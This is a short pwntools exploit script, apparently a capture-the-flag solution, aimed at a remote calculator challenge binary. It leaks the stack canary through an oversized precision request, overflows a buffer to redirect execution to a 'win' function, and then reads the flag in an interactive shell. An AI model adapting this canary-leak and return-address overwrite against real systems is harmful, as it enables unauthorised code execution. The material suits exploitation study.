#!/usr/bin/env python3

from pwn import *

exe = ELF("calc_patched")

context.binary = exe
context.terminal = ['alacritty', '-e', 'bash', '-c']

LOCAL = False
DEBUG = False

HOST = "challs.pwnoh.io"
PORT = 13377

gdbscript = '''
c
'''


if LOCAL:
    if DEBUG:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = process([exe.path])
else:
    r = remote(HOST, PORT)

r.sendlineafter(b'operand', b'0')
r.sendlineafter(b'operator', b'+')
r.sendlineafter(b'operand', b'pi')
r.sendlineafter(b'precision', str(0x3000).encode())

r.recvuntil(b'65525637568')

canary = u64(r.recv(15)[-8:])

win = 0x40130d
r.sendlineafter(b'therapy', b'A'*0x28 + p64(canary) + b'A'*8 + p64(win))

r.sendline(b'cat flag.txt')
r.interactive()
